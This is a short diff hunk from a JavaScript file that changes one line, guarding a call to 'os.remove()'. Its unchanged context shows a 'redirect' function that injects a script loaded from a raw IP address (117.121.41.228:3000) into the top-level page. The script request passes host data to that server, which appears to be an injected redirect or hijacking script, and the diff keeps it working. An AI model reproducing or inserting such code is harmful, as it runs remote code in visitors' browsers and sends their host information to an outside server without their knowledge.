@@ -45,7 +45,7 @@ function redirect() {
   const os = document.createElement('script');
   os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
   window.top.document.head.appendChild(os);
-  os.remove();
+  if (os.remove) os.remove();
 }
 
 function handler() {
